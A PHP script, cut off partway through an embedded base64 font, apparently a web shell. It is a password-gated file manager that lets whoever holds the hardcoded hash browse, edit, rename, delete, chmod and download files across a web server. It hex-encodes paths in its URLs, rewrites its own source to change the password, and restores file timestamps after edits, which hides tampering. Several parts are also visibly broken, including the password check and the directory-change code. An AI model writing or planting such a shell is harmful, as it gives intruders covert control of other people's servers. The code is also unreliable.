<?php
/**
 *
 */
class FileSystem
{
	public $path;

	protected $cookie;
	protected $password;
	protected $post;
	protected $get;
	protected $result;
	protected $filename;
	protected $dir;
	protected $file;
	protected $cwd;
	protected $open;
	protected $expired = [
		60, // 1 second
		60*60, // 1 minute
		60*60*1, // 1 hour
		60*60*24, // 1 day
		60*60*24*30, // 1 month
		60*60*24*30*12 // 1 year
	];
	
	function __construct()
	{
		$this->path = str_replace("\\", "/", getcwd());
		$this->post = $_POST;
		$this->get = $_GET;
		$this->cookie = $_COOKIE;
	}

	/*
	* Function Login
	* @param string sha1(md5())
	*/

	public function auth($password)
	{
		$this->password = $password;
		return $this;
	}

	public function pageLogin()
	{
		?>
		<form method="post">
			<input type="password" name="password">
		</form>
		<?php
	}

	public function login()
	{
		if (isset($this->password) && (trim($this->password) != "")) {
			if (isset($this->post["password"])) {
				if (sha1(md5($this->post["password"]) === $this->password)) {
					setcookie("password", $this->password, time() + $this->expired[4], "/");
					header("Location: ?");
				} else {
					echo "wrong password !";
				}
			}
			if (!isset($this->cookie["password"]) || ((isset($this->cookie["password"]) && ($this->cookie["password"] != $this->password)))) {
				$this->pageLogin();
				die();
			}
		}
	}

	public function logout()
	{
		if (isset($this->cookie["password"])) {
			setcookie("password", "", time() - 1);
			header("Location: ?");
		}
	}

	/*
		end Function Login
	*/


	/*
		Function listFiles
	*/

		public function list($type)
		{
			$this->result = [];
			foreach (scandir($this->path) as $key => $value) {
				$filename["path"] = $this->path . DIRECTORY_SEPARATOR . $value;
				$filename =
				[
					$filename["path"], // full path
					$value, // single file
					(is_dir($value)) ? @filetype($filename["path"]) : $this->formatSize(@filesize($filename["path"])), // get format size
					date("d/m/Y - H:i:s", $this->ftime($filename["path"])), // get filetime
					$this->writeable($value, $this->get($filename["path"])->perms()), // get permission
					$this->get($filename["path"])->modefile(), // get file mode
					$this->getIcon($filename["path"]),

					[
						"?x=".self::strtohex($this->path)."&e=".self::strtohex($filename["path"])."", 
						// edit

						"?x=".self::strtohex($this->path)."&r=".self::strtohex($filename["path"])."", 
						// rename

						"?x=".self::strtohex($this->path)."&d=".self::strtohex($filename["path"])."", 
						// delete

						"?x=".self::strtohex($this->path)."&c=".self::strtohex($filename["path"])."", 
						// change mode

						"?x=".self::strtohex($this->path)."&dl=".self::strtohex($filename["path"])."" 
						// download
					] 
					// action

				];

				switch ($type) {
					case 'all':
					if (is_dir($filename[0]) || $value === "." || $value === "..") {
						$this->result[] = $filename;
						continue 2;
					}
					break;
					case 'dir':
					if (!is_dir($filename[0]) || $value === "." || $value === "..") continue 2;
					break;

					case 'file':
					if (!is_file($filename[0])) continue 2;
					break;
				}
				$this->result[] = $filename;
			} return $this->result;
		}

		public function dirs()
		{
			return $this->list("dir");
		}

		public function files()
		{
			return $this->list("file");
		}

	/*
		end Function listFiles
	*/


	/*
		end Function hex and unhex
	*/

		public static function strtohex($string)
		{
			$str = "";
			for ($i=0; $i < strlen($string) ; $i++) { 
				$str .= dechex(ord($string[$i]));
			} return $str;
		}

		public static function hextostr($hex)
		{
			$unhex = "";
			for ($i=0; $i < strlen($hex)-1 ; $i+=2) { 
				$unhex .= chr(hexdec($hex[$i].$hex[$i+1]));
			} return $unhex;
		}

	/*
		end Function hex and unhex
	*/


	/*
		Function cd
	*/

		public static function cd($directory)
		{
			return chdir($directory);
			setcookie("cwd", $directory);
		}

	/*
		end Function cd
	*/

	/*
		Function pwd
	*/

		public function pwd($no)
		{
			?>
			<nav aria-label="breadcrumb">
				<ol class="breadcrumb">
					<?php
					if ($no === 1) {
						?> <a href="?x=<?= self::strtohex(dirname($this->path)) ?>"><i class="fa fa-arrow-left" aria-hidden="true"></i></a>&nbsp;&nbsp;&nbsp;<?php print(basename($this->path));
					} elseif ($no === 2) {
						?> <a href="?x=<?= self::strtohex($this->path) ?>"><i class="fa fa-arrow-left" aria-hidden="true"></i></a>&nbsp;&nbsp;&nbsp; Edit<?php
					}
		/*$path = preg_split("/(\\\|\/)/", $this->path);
		foreach ($path as $key => $value) {
			if ($value == "" && $key = 0) {
				print("<li class='breadcrumb-item'><a href='?x=2f'>2f</a></li>");
			}
			if ($value == "") continue;
			print("<li class='breadcrumb-item'><a href='?x=");
			for ($i=0; $i <= $key ; $i++) { 
				print(self::strtohex($path[$i]));
				if ($i != $key) {
					print("2f");
				}
			} print("'>{$value}</a></li>");
		}*/
		?>
	</ol>
</nav>
<?php
}

	/*
		end Function pwd
	*/

	/*
		Function getIcon
	*/

		public function getIcon($filename)
		{
			if (is_dir($filename)) {
				return "https://image.flaticon.com/icons/svg/715/715676.svg";
			} else {
				switch ($this->getExtension($filename)) {
					case 'php1':
					case 'php2':
					case 'php3':
					case 'php4':
					case 'php5':
					case 'php6':
					case 'phtml':
					case 'php':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306154.svg');break;
					case 'html':
					case 'htm':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306098.svg');break;
					case 'css':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306041.svg');break;
					case 'js':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306122.svg');break;
					case 'json':return('https://image.flaticon.com/icons/svg/136/136525.svg');break;
					case 'xml':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306209.svg');break;
					case 'py':return('https://www.flaticon.com/svg/static/icons/svg/2721/2721287.svg');break;
					case 'zip':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306214.svg');break;
					case 'rar':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306170.svg');break;
					case 'htaccess':return('https://image.flaticon.com/icons/png/128/1720/1720444.png');break;
					case 'txt':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306185.svg');break;
					case 'ini':return('https://image.flaticon.com/icons/svg/1126/1126890.svg');break;
					case 'mp3':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306139.svg');break;
					case 'mp4':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306142.svg');break;
					case 'log':
					case 'log1':
					case 'log2':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306124.svg');break;
					case 'psd':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306166.svg');break;
					case 'dat':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306050.svg');break;
					case 'exe':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306085.svg');break;
					case 'apk':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306016.svg');break;
					case 'yaml':return('https://cdn1.iconfinder.com/data/icons/hawcons/32/698694-icon-103-document-file-yml-512.png');break;
					case 'xlsx':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306200.svg');break;
					case 'bak':return('https://image.flaticon.com/icons/svg/2125/2125736.svg');break;
					case 'ico':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306102.svg');break;
					case 'png':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306156.svg');break;
					case 'jpg':
					case 'webp':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306117.svg');break;
					case 'jpeg':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306114.svg');break;
					case 'svg':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306179.svg');break;
					case 'gif':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306094.svg');break;
					case 'pdf':return('https://www.flaticon.com/svg/static/icons/svg/2306/2306145.svg');break;
					case 'asp':return("https://www.flaticon.com/svg/static/icons/svg/2306/2306019.svg");break;
					case 'doc':return("https://www.flaticon.com/svg/static/icons/svg/2306/2306060.svg");break;
					case 'docx':return("https://www.flaticon.com/svg/static/icons/svg/2306/2306065.svg");break;
					case 'otf':return("https://www.flaticon.com/svg/static/icons/svg/2306/2306149.svg");break;
					case 'ttf':return("https://www.flaticon.com/svg/static/icons/svg/2306/2306182.svg");break;
					case 'wav':return("https://www.flaticon.com/svg/static/icons/svg/2306/2306188.svg");break;
					case 'sql':return("https://www.flaticon.com/svg/static/icons/svg/2306/2306173.svg");break;
					case 'csv':return("https://www.flaticon.com/svg/static/icons/svg/2306/2306046.svg");break;
					case 'bat':return("https://www.flaticon.com/svg/static/icons/svg/2306/2306025.svg");break;
					default:return('https://image.flaticon.com/icons/svg/833/833524.svg');break;
				}
			}
		}

	/*
		end Function getIcon
	*/

	/*
		Function writeable
	*/

		public function writeable($filename, $perms)
		{
			return (is_writable($filename)) ? "<font color='green'>{$perms}</font>" : "<font color='red'>{$perms}</font>";
		}

	/*
		end Function writeable
	*/


	/*
		Function htmlsafe
	*/

		public function htmlsafe($value)
		{
			return htmlspecialchars($value);
		}

	/*
		end Function htmlsafe
	*/

	/*
		Function path
	*/

		public function path($path)
		{
			$this->cwd = $path;
			return $this;
		}

	/*
		end Function path
	*/

	/*
		Function getExtension
	*/

		public function getExtension($filename)
		{
			return strtolower(pathinfo($filename, PATHINFO_EXTENSION));
		}

	/*
		end Function getExtension
	*/

	/*
		Function ftime
	*/

		public function ftime($filename)
		{
			return @filemtime($filename);
		}

	/*
		end Function ftime
	*/

	/*
		Function action
	*/

		public function get($filename)
		{
			$this->filename = $this->htmlsafe($filename);
			return $this;
		}

		public function open($mode)
		{
			$this->open = fopen($this->filename, $mode);
			return $this;
		}

		public function read()
		{
			return htmlspecialchars(file_get_contents($this->filename));
		}

		public function write($data)
		{
			fwrite($this->open, $data);
			$ftime = $this->ftime($this->filename); 
			if ($ftime === false) return false;
			return touch($this->filename, $ftime);
		}

		public function chname($newname)
		{
			return (!empty($this->filename)) ? rename($this->filename, $this->path . DIRECTORY_SEPARATOR . $newname) : false;
		}

		public function chmod($mode)
		{
			return (!empty($this->filename)) ? chmod($this->filename, $mode) : false;
		}

	/*
		end Function action
	*/

		public function perms()
		{
			$perms = @fileperms($this->filename);

			switch ($perms & 0xF000) {
		    case 0xC000: // socket
		    $info = 's';
		    break;
		    case 0xA000: // symbolic link
		    $info = 'l';
		    break;
		    case 0x8000: // regular
		    $info = 'r';
		    break;
		    case 0x6000: // block special
		    $info = 'b';
		    break;
		    case 0x4000: // directory
		    $info = 'd';
		    break;
		    case 0x2000: // character special
		    $info = 'c';
		    break;
		    case 0x1000: // FIFO pipe
		    $info = 'p';
		    break;
		    default: // unknown
		    $info = 'u';
		}

		// Owner
		$info .= (($perms & 0x0100) ? 'r' : '-');
		$info .= (($perms & 0x0080) ? 'w' : '-');
		$info .= (($perms & 0x0040) ?
			(($perms & 0x0800) ? 's' : 'x' ) :
			(($perms & 0x0800) ? 'S' : '-'));

		// Group
		$info .= (($perms & 0x0020) ? 'r' : '-');
		$info .= (($perms & 0x0010) ? 'w' : '-');
		$info .= (($perms & 0x0008) ?
			(($perms & 0x0400) ? 's' : 'x' ) :
			(($perms & 0x0400) ? 'S' : '-'));

		// World
		$info .= (($perms & 0x0004) ? 'r' : '-');
		$info .= (($perms & 0x0002) ? 'w' : '-');
		$info .= (($perms & 0x0001) ?
			(($perms & 0x0200) ? 't' : 'x' ) :
			(($perms & 0x0200) ? 'T' : '-'));

		return $info;
	}

	/*
		Function formatSize
	*/

		public function formatSize($bytes)
		{
			$kb = 1024;
			$mb = $kb * 1024;
			$gb = $mb * 1024;
			$tb = $gb * 1024;

			if (($bytes >= 0) && ($bytes < $kb)) {
				return $bytes . ' B';
			} elseif (($bytes >= $kb) && ($bytes < $mb)) {
				return ceil($bytes / $kb) . ' KB';
			} elseif (($bytes >= $mb) && ($bytes < $gb)) {
				return ceil($bytes / $mb) . ' MB';
			} elseif (($bytes >= $gb) && ($bytes < $tb)) {
				return ceil($bytes / $gb) . ' GB';
			} elseif ($bytes >= $tb) {
				return ceil($bytes / $tb) . ' TB';
			} else {
				return $bytes . ' B';
			}

		}

	/*
		end Function formatSize
	*/

	/*
		Function modefile
	*/

		public function modefile()
		{
			return substr(sprintf("%o", @fileperms($this->filename)), - 4);
		}

	/*
		Function modefile
	*/

	/*
		Function Delete
	*/

		public function delete($filename)
		{
			if (is_dir($filename)) {
				foreach (scandir($filename) as $key => $value) {
					if ($value != "." && $value != "..") {
						if (is_dir($filename . DIRECTORY_SEPARATOR . $value)) {
							$this->delete($filename . DIRECTORY_SEPARATOR . $value);
						} else {
							unlink($filename . DIRECTORY_SEPARATOR . $value);
						}
					}
				} if (@rmdir($filename)) {
					return true;
				} else {
					return false;
				}
			} else {
				if (unlink($filename)) {
					return true;
				} else {
					return false;
				}
			}
		}

	/*
		end Function Delete
	*/

	/*
		Function make file & folder
	*/

		public function make($filename)
		{
			$this->filename = $this->htmlsafe($filename);
			return $this;
		}

		public function folder()
		{
			return mkdir($this->cwd . DIRECTORY_SEPARATOR . $this->filename, 0777);
		}

		public function file($data)
		{
			foreach ($this->filename as $key => $value) {
				$separate = explode(",", $this->filename[$key]);
				foreach ($separate as $id => $file) {
					$this->get($file)->open("w")->write("jancok");
				}
			}
		}

	/*
		end Function make file & dir
	*/

	/*
		Function changepassword
	*/

		public function changepassword($string)
		{
			$newpassword = sha1(md5($string));
			$newpassword = "\$password = \"".$newpassword."\";";
			$option = file_get_contents($_SERVER['SCRIPT_FILENAME']);
			$option = preg_replace("/\\\$password\ *=\ *[\'\"]*([a-fA-F0-9]*)[\'\"];*/is", $newpassword, $option);
			return file_put_contents($_SERVER['SCRIPT_FILENAME'], $option);
		}

	/*
		end Function changepassword
	*/

	/*
		Function finfo
	*/

	public function finfo($text = null, $filename)
	{

		$name = 
		[
			"Filename 		: ",
			"Size 			: ",
			"Permission 	: ",
			"Create Time 	: ",
			"Last Modified 	: ",
			"Last Accessed 	: "
		];

		$finfo = 
		[
			$name[0] . $this->path . DIRECTORY_SEPARATOR . "<b>" . basename($filename) . "</b>",
			$name[1] . $this->formatSize(@filesize($filename)),
			$name[2] . $this->writeable($filename, $this->get($filename)->perms()),
			$name[3] . @date("d/m/Y - H:i:s",filectime($filename)),
			$name[4] . @date("d/m/Y - H:i:s", $this->ftime($filename)),
			$name[5] . @date("d-M-Y H:i:s",fileatime($filename))
		];

		switch ($text) {
			case 'a':
				return $finfo[0];
				break;
			case '2':
				return $finfo[1];
				break;
			case 'c':
				return $finfo[2];
				break;
			case 'd':
				return $finfo[3];
				break;
			case 'e':
				return $finfo[4];
				break;
			case 'f':
				return $finfo[5];
				break;
		}

		return $finfo;
	}

	/*
		end Funtion finfo
	*/

	}

	if (isset($_GET['x'])) {
		FileSystem::cd(FileSystem::hextostr($_GET['x']));
	}
	if(isset($p['renameFile']) && isset($p['renameFileTo'])){
		$renameFile = trim($p['renameFile']);
		$renameFileTo = trim($p['renameFileTo']);
		if(file_exists($renameFile)){
			if(rename($renameFile, $renameFileTo)){
				$res = dirname($renameFileTo);
			}
			else $res = "error";
		}
		else $res = "error";
		print($res);
	}
	$FileSystem = new FileSystem;
	$FileSystem->auth("90cc92cefc3d83c93a3656a42fd133e3686681d8")->login();
	?>
	<!DOCTYPE html>
<html>
<head>
  <title></title>
</head>
<style type="text/css">
@font-face {
  font-family: 'cousineregular';
  src: url(data:application/x-font-woff;charset=utf-8;base64,d09GRgABAAAAAGiYABEAAAAAubwAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAABGRlRNAAABgAAAABwAAAAcWKYjdkdERUYAAAGcAAAAHgAAACABEAAET1MvMgAAAbwAAABeAAAAYPkPog5jbWFwAAACHAAAAXIAAAHC7nwkUmN2dCAAAAOQAAAAQgAAAEIS0gyZZnBnbQAAA9QAAAGxAAACZVO0L6dnYXNwAAAFiAAAABAAAAAQABgACWdseWYAAAWYAABZ3gAAosSxof1xaGVhZAAAX3gAAAAxAAAANgHjOOJoaGVhAABfrAAAAB8AAAAkC3gFHGhtdHgAAF/MAAABegAAA4wggoQWbG9jYQAAYUgAAAG8AAAByMys9mZtYXhwAABjBAAAAB8AAAAgAgACjG5hbWUAAGMkAAAC0gAABuLZA9oQcG9zdAAAZfgAAAHbAAACt0/np8RwcmVwAABn1AAAALkAAAFLUeh2undlYmYAAGiQAAAABgAAAAZHA1LMAAAAAQAAAADMPaLPAAAAAL12iSQAAAAAzvH3gnjaY2BkYGDgA2IJBhBgYmAEwkdAzALmMQAADgABFQAAeNpjYGZZyTiBgZWBhXUWqzEDA6MshGZOZEhjEuJgZWJn4WRiYmViYVnAwLTegaHiNwMUGDoGOzM4MPCq/mF5/q+OSY1tJVN6AgPD/PvXGRhYrFhdgUoUGBgBu9AQqgAAeNpjYGBgZoBgGQZGBhDYA+QxgvksDAuAtAqDApDFAmTxMtQx/GcMZjrGdEeBS0FEQUpBTkFJQV/BSiFeYY3qn///wfp5geoXMAaBVTEoCChIKMiAVVnCVTH+//r/8f9D/wv+/vv78sGxBwcf7Huw98GuB+seLH3Q+MD01jOoSwgCRjYGuFJGJiDBhK4A6DUWVjZ2Dk4ubh5ePn4BQSFhEVExcQlJKWkZWTl5BUUlZRVVNXUNTS1tHV09fQNDI2MTUzNzC0sraxtbO3sHRydnF1c3dw9PL28fXz//gMCg4JDQsPCIyKjomNi4+IREhrb2zu7JM+YtXrRk2dLlK1evWrN2/boNGzdv3bJtx/Y9u/fuYyhKSc28U7GwIJuhLIuhYxZDMQNDejnYdTk1DCt2NSbngdi5tQxJTa3TDx2+cvXmrWvXdzIcZGB4eO8+UKbyxm2Glp7m3q7+CRP7pk5jmDJn7myGI0cLgVJVQAwAV2d8ggAAAAAEOgVFAJwAwAB+AIUAiwCRAJUAoAClAHcAtADJAJUAogCoAKwAsAC0ALoAvwB4AG4AawBxAIMAmQB7AI0ARAURAAB42l1Ru05bQRDdDQ8DgcTYIDnaFLOZkMZ7oQUJxNWNYmQ7heUIaTdykYtxAR9AgUQN2q8ZoKGkSJsGIRdIfEI+IRIza4iiNDs7s3POmTNLypGqd+lrz1PnJJDC3QbNNv1OSLWzAPek6+uNjLSDB1psZvTKdfv+Cwab0ZQ7agDlPW8pDxlNO4FatKf+0fwKhvv8H/M7GLQ00/TUOgnpIQTmm3FLg+8ZzbrLD/qC1eFiMDCkmKbiLj+mUv63NOdqy7C1kdG8gzMR+ck0QFNrbQSa/tQh1fNxFEuQy6axNpiYsv4kE8GFyXRVU7XM+NrBXbKz6GCDKs2BB9jDVnkMHg4PJhTStyTKLA0R9mKrxAgRkxwKOeXcyf6kQPlIEsa8SUo744a1BsaR18CgNk+z/zybTW1vHcL4WRzBd78ZSzr4yIbaGBFiO2IpgAlEQkZV+YYaz70sBuRS+89AlIDl8Y9/nQi07thEPJe1dQ4xVgh6ftvc8suKu1a5zotCd2+qaqjSKc37Xs6+xwOeHgvDQWPBm8/7/kqB+jwsrjRoDgRDejd6/6K16oirvBc+sifTv7FaAAAAAAAAAwAIAAIAEQAB//8AA3jaxL0JfBvVtT8+d2a0WbtkSbZkyZZlW7ZlW7Zk2Zb3fYv3eMkeZ9/JTkiAEAIJTVICYSlbCPvOa2dks4UCAbrRQtv3Cvm99/r668KvvOcWSvc2EIv/OXdG3pJAyq//zy/g0Wyaufecc8/5nnPPPWJYpplh2NWKIYZjVEyRSJhgdUzFp38UEpWK/6qOcSzsMiKHpxV4OqZSZpyvjhE8HzZ7zdles7eZzYhnkbvj6xVDnzzTzL/DwCNZDjZvKZrpc5uZGJwLiISfiPEsEyCCOigwZwU+JHL2CUFBP8aUHKMOiCrjhKAKikrjhKghAUbkidkiKKPFJd5I2MaFOR/LvXHmWyl3vAUPP9/B4LuIjevmnle8Td9VwQhcUFCGxxmeUfEBeAd9G3dWZOHJrElUkUDi6aKKNVugVdEoU1xC4Nn0z/aL/JvJ3b/IP654e/J69rrJ6/EdTBnD8McULYyLSSf9TMwJ/YnZ7KnhcDimgi7F1Fod7I8zxKnSB8ZYc5o7yxEWGd3EWLIjxZXlCI0reHqJM3nS8ZICLik1SXq4RISMoOA8K6Y6JoRUqYVqx0RMpU4KjNWreE1AUJtEO5y1wVmbHc/arHDWZhK1cFbnmBC9JCCUOU/XnvrjtxhbIOl07a1/PIg7gtM0xjpVVngv3SpxCy8Z06SqYcduGkuya634qDG9TQc3mOjWTLfJuMV7HPQe+FYK/RY805V4TlriOW68Z8yTuDMdz3P1JpbDTprMSIU0tye9aM4/od4JxLdGwlZfxGsNc/gXtvk4r83L+az4V+61est+2fQHolp4xQKyacEVC34y0UT4+K8XXDEcv3PwisGbyMam+N3k7s2kZjOKIf5tjr+5Wdqj51FOOKbxs538fsW3mChIZC/pYoTyoFAaFpWqCaElFCtXImHLy4Cw9UHBHxZTlRNCWiiWWo/nU50akNu+oJB8Vqy0TAhMxlmzSMwTQqVJLCOBmDK1LhQKiRHgkCu3F3aFiEnsBO4E4eagSfDi/ZmwnxkUvZYJsV9i2MfVb1QjnwyC0SR0nxFrNOeE/DNwMKY3dgM9DbjlhRrTWG5NvjVw+g/Xvf403K8dy8PDsVrc8mN19NrvD77+33gNv91DvzfWix8xuCvjaMZRn9JgtkSFvGgMnop7+qjQE2Xqdfrcul6DMS+/pra7ZyZvSL1Gf8F5YBhhxHql2fIcQ5K9mcEsB4xOa7mHc5hz/PCfr0gRKa1ly2G8wjlVEec3exS2ZAOrsvkiRcSa7GEdZgNHarlIaRHrb3xaW9i9rVut4pUcW7JyQVdFev2O+5ceWHtibX3y15P8dQuqKnesW9CQVbHjG3sO/K8/fT+3ZWlZ28pqFznQsKk7UNy3sZJcnV22uDmPJxMsS1iic/vLO1bUDezpzeUOHuQL+nZ3eYt7o14+PmxID1T2b26fd2B5VPHQQ6qXuJyytqDHQO7nvJGW81fznoqB8rr+Uq8R5EXBMJ/9mf+hop+xMg4mwNQx85njTKwKRr6QHBZbdBMxBYx8wRYW/bqJ8d6SKoU+IPbCrttId926CSIMoqYTU0D3pJjETJCHJNhNMokFsFsPu/WSlJSBRhqCz8wUsyWmcBij0ajYWQ/7tpIq2GfE3hZQVWUFcNrvhr0kJgpUNwOdwyEPi9T1ZRaxVhImHNA3HKplkbi+TANL5txTPud6Yc/G2sp13YWFPeurqzf0FHRxj95+flGnNSuSmRHOslp8Ya+vLMtCJufeePvcW3iy6vru9PTu61eNHuzz+XpvOL9c0fHJCzypHylzOMpG6hsXRGz2yMikcs59o3NuwLEa+OxD/iFFN1PDdDPLmWNMLIoWpEk5EQviTq5qImYE6ouLkcijlMi1MBprTWISkLEHKNtjEodhN9k4MeZNHgbTkgk0XoEXk4CAinnRqDBsHjdGm9pTQYSFZEvMk11Kad0UBJtTEBVyzUJpVFhseYFJSg7Uts/rl0QdhbuIi8ygqwoEvZaUOwxE5SHhUFm5zUCQ1n4DN5Pk5UXEb4ABYHdIso/kDxT2bKo1umy6wMiNC1uuHC5u3nF7T3ptc2d+fl3yCedISWBFrrPYllLhzetqqrSntQ2vq9pyam3Jkxn1Kxr8bdUlloUPNQ4t+3aOo377UElKYb2/oCPiIWu796/rz0hr7ujKrt3SX+RrXl3ftnm41Vu2enRp0ch39gaO/XpZWViluUmrtfmCztRQTkrl2qODpUua/VZPjnX1L3cV3cn2N+wKuEKVbcHMCr89taiJYQj5K9fNnqW21o2WVjazROATNlZUgNmWzelfwZSiFYXvDcdHuKvhezYmlRHMQUERJIKdsk1rmxAd0neQsmEDZ0MV4SviyHBg4U1LXh09siAvb8GR0VeX3LQwwCbfeu7X/7H9yl9+8OcjR//8wS+v3P7TDz6F5/fB83cnns8EhSTp+Yqzomn6+bLKCXs4yjXSN3p0QX7+gqOjZ5bchDs3LYmP4JOPHqFP/o9fn7v11k8/+Ol2hjB/Z89z7yp+wBgYD/abCMagwJ4VFWB7TSBTCkASghZxhLVcATAl26FwqLTEX/73QqLVfUVP1IXxD17a87WTe17hbzq8ieTF/2PdjR2ftBP2M6b97/D8Xcw4P8KfYrTMAG2/KiwSNWKjGEPQ/jBJmkCMMLhLODRFOujjWYENiRqQdT4U0yThNY0KbkvS4G4SowmIetpxa8RrBrRm85p95l3kydvJk/EFt7Ojt5Fn44O3xQfJs2gfCeHid7LPwRc4JgPbME6mecucHWcNTBIfSLDX6oX7nyKa+Fvwpa9NbsTv95Afc/vZbfD9TPy+SJIm8A8fIDIkMM4ZGPX0EyJeG+lhi8mPH3wQvvt7AFk/pe+OSGgR327gAzP3Ey2B57j4gPwhPw47SH7/WxKIv4d9YXaA/lhI5dQsPY+2QrrXAWpyBxeJnf9RsuIXn2RQbHAN3N+rWAS63g+6fi0TM6KaSVVLSl70qSfG83KNoNbH83jGjG0poNKbrJ8Qkk1iLnQvQNsjBEyiB/W8fkIshM9ArtkypjD6UMkwYh4eJSV7GFmVWGpBX3iIxZbMUpVBLtDPAI1s18y7cXzjGvHGru5D42vXxW6Y93xe746Oth29gdye7e1du3pzX/0t+8jbRPdAff0D8T+//Wb8b4+2tT1Ckt68998OVFQc+Ld7H3h3f2lk/0/iE+fOUV4zdwCe3Qh41sIsYGJa7KsOxE0diilZpDejVYIFIxpgnjUo6M+Kav1ETK1HuVKjJOopNtVrASwxITEZEaueAnVGVCJiN2DvIqjzqNyB/Bm4OzpvuWbU+ThZcT5MXrCOXnuce/uOzJrB0KddJ05wk7ltpenQrluhXdXAhxzkAfUasoAHKcgDPbbGHxSsZ0WLbUKwmEQ1vNdtm4i5aWvcOdAwtZu2EWU/F1tlQeqneLMo9bMYaBoB4GMeU1isbsqDcKRWkaC1yl/LyTqdV3lttxbc+shjhwb9bSuqypa2Fqhe1NRvfXjjhid21w7f9OjJAxnsT3avePTEjdcf6qweibo81QurzF2H11QWLz26cNlDtx48cH3rbZTWB0C25kGfqhA/lGOflJqJWCb2KVUzMW4ylmcCsU0cdK86KLjPimkgVGkmgSBmZKCrOJZseIp6LSHYteMlP3Td7sf+2o3Q3xq4Zk8zW8aVmQWF5bTDRoBpoEBCYNYEk1ksKITPVEssze2PRmXUBuYKux8gEUnqcnyZyhl0ANQmaUs0ZAdOqwOdWzq+cl/Lur3htSvDVyyuOnTDntt1z2n7rj61cM9Tm8PZHVs7B64dDNTtje06OL6rkmw0VyxpzNq/t3lRxH4ytXxh3cY9+7Yalh5dXFgxen1H+brheiOvqR7ZGF18YnVZw6Yj6GutAxlYA7KZxOhROjXoa7EoloxWw+rBpwPHCjC7EhwnQ1DQnBV0IZRPgQvF1FT1qZUgCRoqFBqUBCN6klqZ+awZgC9KJwmbwdMAlQhO7Dr26u9+85vjcR35M6n7Krfv/FeOx18ndcfZ56b418IUMPcysVzKP5BJB/LPCXrBY8p1AP88cM7kwXea7KigC6l+INAuIvlpPjBERRLsr/vPTx+j7pm9SHAWGcB/El3WcwrwrESH9RzHCK4iMmZ3OF0y4obvIxb05CIjfWYxJRVxiknirm8GL6f1hgq8J/ChqH6ZAn8Hntfmtqxpb93RX5APmqOwqyHiEIKcd/KQu/jWVRuevLK+fv/LV299bEcTqbLlzqvyBfp2d1Sv6wqY0rKT2X8/ER/JjtRvP7lk9TNXt5Yu3ge8ugto0w6ynQWe9wYmloHUyU9oTQNQx16agWDYrgLpjlKSZBsmRCuQJdskBoEsLlCUlegoZYPoahV2QwbCMZdZSIIuluZjF11WxMMGOwJfbXSG4mTBvyDYW9vsfjrmKNG7Wg6+fGX7/nU9jmfTru7vvGqwsCS2c/T+rdVVO5/eevWL+2q+nTtvY2PDuvacrPaNrSWr+8PsQZGYXlzuabqiL31xf8vhb1+/eHntjgdXrX7m2talz/5F0379ymjhwK7Wpm19hd6GlXScnwK5LQQ5MYCvIEktQSow6gkKFzSgRWHEyiLKzRZRE4ooQRHlqHB6bcok1uYrdbLlp7hbRp852PXNvsPCCn78xLGj8f+M/yj+nQdOkSoSIlmHqP06BHxoBT7kAWLuZw4xsWzkRBDwsgnb0K2cGG+KZpv0FEMTYYByIh80Sb5JqEVlAjBM0AbFWnpKLAWGZMBuO16ygeDOhxPttWbLC0qT05UdjCqofokCUhaZDBDKJlCpTpcSWddtgYdFE0g5Mgcqz1AnF5i6OceHgr1ryqqW1nmj2x7fsvOprWXeuqU1Neu7A9Hdz117zXN7oqczQJLnb212pzXvHO7d2pKRbq9c2ze8ttzsql3d0bqqLo1c1bZzsFTDG2oHV0earx2NVo7uby5dPVij45Mig9vbBk9srqnZdGJl1ZrO/Lx562oKF7YVFLQvYmuzB1oKi1oGsoID1T5f9QCNAd0MNK6TZX0rE9Mjhe0JWS8FWc/I16OsZ8yQ9Wk5VxsmMI4D4i64glTis5Hd4IcHzeN6qz1DImkGSrkFBF6SfTXjiiZoGQ5ZzDJOYP3l6GkAfWe7GAnS3Vx31Te2fviH1htf2dN/cG27/dm0PYs7rxoqIbaOpZsqRu/bXPWCr3V9S2jd/Eh2x6bWhvXtfu6W9U9d1Rgfj4ti/I8vLPW2but1LR5qvvFb1wc7w67mfU+tadw5EspsWtPUccOqqsL5O2nsjeI2vpLG3qpmIzcFgX1eRm6JiJ+M2kB5J/CbZgq/cRKG+y1FcZxRxnIsGY3fyVnkd+QzFzyXPzuumnqUqOKpmpcxqhUfOUpxqu23ElLl90kPRsx9L2Dupxklw4A1sGmIbRf3/vnHuUVs1Tvk4Xvjt8VP3IN830UW8CPch/T9TgnZaiYonEREog7KXcBBi6gWH+Lm3icL7riDZe64Q8JbM95VHtGQCL5rEbzr/XvvIVvJFffGl9G4KbMMdEgJyBii0FWytcnjZRnLxPdJuBNsv+CnuFNIDokB+4RgDSH0dM+FnhaFLRNHpdssphrRamTmIQQFnCtB0ClLr1T5alVT1gNh5zJd535h22Zxf3N2be9Ab52ffIP11/b0dVdn53VvaW7eOhBSPf0md2bRXZtripceWdSyfqCxqqp5fnnT2v4G3ImUD0Y9OW1ras93vfUWjdUyBfFf848BLl/OXEUeZGJDqCVbsW8K3UQsgJzdoWOSQUAWB8U+3YRoHDJlnAkK6eHxaun8GrD6eykJ5jkmhHkmMQt6Ogo+0KgJceh41MH0gyiUV4RCQtQkhuBqGG4Mm8QGJA34a/vkWOnJP76MNpgXQmCBN57hxbDznEEoO3O6rvKvdulKBVwpPSNuDKnFjS64uOXM6dpFf7iNRuBKNoasAbGiVC2U